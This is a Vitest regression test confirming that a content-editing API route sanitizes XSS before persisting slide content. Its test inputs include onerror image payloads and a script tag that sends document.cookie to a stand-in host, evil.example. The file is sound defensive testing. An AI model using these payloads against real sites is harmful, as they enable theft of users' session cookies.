/**
 * PATCH /:jobId/content — XSS sanitization regression test (manage.ts).
 *
 * Prior bug: this handler (the inline slide-edit save path) persisted
 * req.body.content straight to jobsMemory/DB with no sanitization, even
 * though stripScriptsAndEventHandlers() — already used correctly elsewhere
 * in this codebase (content.ts) — exists for exactly this purpose. Since
 * finalOutput.content also feeds the carousel SSR export route and the
 * PDF/text export routes, an unsanitized value here weakened the same
 * defense-in-depth those paths rely on the function for.
 *
 * This test mounts the REAL router from routes/jobs/manage.ts (not a copy of
 * its logic) and asserts a payload containing an onerror handler is stripped
 * before it reaches jobsMemory — the store this test's "no DB" setup treats
 * as the persisted value (mirrors tests/security/content-routes-idor.test.ts's
 * same db:null pattern).
 *
 * WHY lib/carousel.js is mocked rather than imported for real:
 * that module runs `initPool().catch(() => {})` at import time, which
 * attempts to launch 2 real headless Chromium processes (up to ~10s,
 * Promise.allSettled) — no other test in this suite imports it for exactly
 * that reason. The mock below is a byte-for-byte copy of the real
 * stripScriptsAndEventHandlers regex chain in src/lib/carousel.ts; keep the
 * two in sync if that function ever changes.
 */
import { describe, it, expect, beforeEach, vi } from 'vitest';
import express from 'express';
import supertest from 'supertest';

vi.mock('../../src/config.js', () => ({
  env: {
    DATABASE_URL: 'postgres://test',
    CLERK_SECRET_KEY: 'test_secret',
    GEMINI_API_KEY: 'test_key',
    NODE_ENV: 'test',
    PORT: '3001',
    FRONTEND_URL: 'http://localhost:5173',
    APP_URL: 'http://localhost:3001',
    RATE_LIMIT_MAX_JOBS: '10',
    OAUTH_STATE_SECRET: 'test-oauth-secret-that-is-long-enough-32',
    OPENAI_API_KEY: undefined,
    TOGETHER_API_KEY: undefined,
    GROQ_API_KEY: undefined,
    TAVILY_API_KEY: undefined,
    LINKEDIN_CLIENT_ID: undefined,
    LINKEDIN_CLIENT_SECRET: undefined,
    TWITTER_CLIENT_ID: undefined,
    TWITTER_CLIENT_SECRET: undefined,
    UPSTASH_REDIS_URL: undefined,
    UPSTASH_REDIS_TOKEN: undefined,
    REDIS_URL: undefined,
    TOKEN_ENCRYPTION_KEY: undefined,
    SENTRY_DSN: undefined,
    CORS_ORIGINS: undefined,
  },
}));

vi.mock('../../src/db/index.js', () => ({ db: null }));
vi.mock('../../src/db/schema.js', () => ({ contentJobs: {}, contentOutputs: {} }));
vi.mock('../../src/workers/contentWorker.js', () => ({
  getJobFromStore: () => undefined,
  setJobInStore: vi.fn(),
}));
vi.mock('../../src/lib/queue.js', () => ({ addJobToQueue: vi.fn().mockResolvedValue(false) }));
vi.mock('../../src/lib/sse.js', () => ({ sseManager: { sendEvent: vi.fn() } }));
vi.mock('../../src/lib/pipeline.js', () => ({ runAndPersistPipeline: vi.fn() }));
vi.mock('../../src/routes/users.js', () => ({ getUserProfile: vi.fn().mockResolvedValue({}) }));
vi.mock('../../src/routes/jobs/create.js', () => ({ runPipelineDirect: vi.fn() }));

// See file header WHY — faithful copy of src/lib/carousel.ts's real export,
// kept out of the real module to avoid its Puppeteer initPool() side effect.
vi.mock('../../src/lib/carousel.js', () => ({
  stripScriptsAndEventHandlers: (html: string): string =>
    html
      .replace(/<script\b[^>]*>[\s\S]*?<\/script>/gi, '')
      .replace(/\bon\w+\s*=\s*(?:"[^"]*"|'[^']*'|[^\s>]+)/gi, '')
      .replace(/javascript\s*:/gi, 'removed:')
      .replace(/data\s*:\s*text\/html/gi, 'removed:')
      .replace(/<meta\b[^>]*http-equiv\s*=\s*["']?refresh["']?[^>]*>/gi, ''),
}));

const OWNER = 'owner-user-1';

async function buildApp() {
  const { jobsMemory } = await import('../../src/routes/jobs/ownership.js');
  const { default: manageRouter } = await import('../../src/routes/jobs/manage.js');

  const app = express();
  app.use(express.json());
  app.use((req: any, _res, next) => {
    req.dbUserId = req.header('x-test-user-id');
    next();
  });
  app.use('/api/jobs', manageRouter);
  return { app, jobsMemory };
}

describe('PATCH /:jobId/content — XSS sanitization', () => {
  let jobId: string;

  beforeEach(async () => {
    vi.clearAllMocks();
    const { jobsMemory } = await import('../../src/routes/jobs/ownership.js');
    jobsMemory.clear();
    jobId = `00000000-0000-0000-0000-${Date.now().toString().padStart(12, '0')}`;
    jobsMemory.set(jobId, {
      id: jobId,
      userId: OWNER,
      deleted: 0,
      status: 'done',
      platform: 'linkedin_post',
      topic: 'XSS sanitization test job',
      outputs: [
        { agentName: 'writer', outputType: 'final', content: { hook: 'H', body: 'B', cta: 'C', hashtags: [] } },
      ],
    });
  });

  it('strips an onerror handler from a top-level string content field', async () => {
    const { app, jobsMemory } = await buildApp();
    const res = await supertest(app)
      .patch(`/api/jobs/${jobId}/content`)
      .set('x-test-user-id', OWNER)
      .send({ content: '<img src=x onerror=alert(1)>' });

    expect(res.status).toBe(200);

    const persisted = jobsMemory.get(jobId).outputs.find((o: any) => o.outputType === 'final').content;
    expect(persisted).not.toContain('onerror');
    expect(persisted).not.toContain('alert(1)');
  });

  it('strips an onerror handler from a string leaf nested inside an object', async () => {
    const { app, jobsMemory } = await buildApp();
    const res = await supertest(app)
      .patch(`/api/jobs/${jobId}/content`)
      .set('x-test-user-id', OWNER)
      .send({ content: { hook: '<img src=x onerror=alert(1)>', body: 'clean body', cta: 'Click', hashtags: [] } });

    expect(res.status).toBe(200);

    const persisted = jobsMemory.get(jobId).outputs.find((o: any) => o.outputType === 'final').content;
    expect(persisted.hook).not.toContain('onerror');
    expect(persisted.body).toBe('clean body'); // unrelated clean fields pass through unchanged
  });

  it('strips an onerror handler from a string leaf nested inside an array of objects (carousel slides shape)', async () => {
    const { app, jobsMemory } = await buildApp();
    const res = await supertest(app)
      .patch(`/api/jobs/${jobId}/content`)
      .set('x-test-user-id', OWNER)
      .send({
        content: [
          { headline: 'Slide 1', body: '<img src=x onerror=alert(document.cookie)>' },
          { headline: 'Slide 2', body: 'clean' },
        ],
      });

    expect(res.status).toBe(200);

    const persisted = jobsMemory.get(jobId).outputs.find((o: any) => o.outputType === 'final').content;
    expect(persisted[0].body).not.toContain('onerror');
    expect(persisted[0].headline).toBe('Slide 1');
    expect(persisted[1].body).toBe('clean');
  });

  it('strips a <script> tag in addition to inline event handlers', async () => {
    const { app, jobsMemory } = await buildApp();
    await supertest(app)
      .patch(`/api/jobs/${jobId}/content`)
      .set('x-test-user-id', OWNER)
      .send({ content: 'before<script>fetch("https://evil.example/steal?c="+document.cookie)</script>after' });

    const persisted = jobsMemory.get(jobId).outputs.find((o: any) => o.outputType === 'final').content;
    expect(persisted).not.toContain('<script>');
    expect(persisted).not.toContain('evil.example');
    expect(persisted).toBe('beforeafter');
  });

  it('non-owner PATCH still 404s (sanitization does not bypass the ownership check)', async () => {
    const { app } = await buildApp();
    const res = await supertest(app)
      .patch(`/api/jobs/${jobId}/content`)
      .set('x-test-user-id', 'attacker-user-2')
      .send({ content: '<img src=x onerror=alert(1)>' });

    expect(res.status).toBe(404);
  });
});
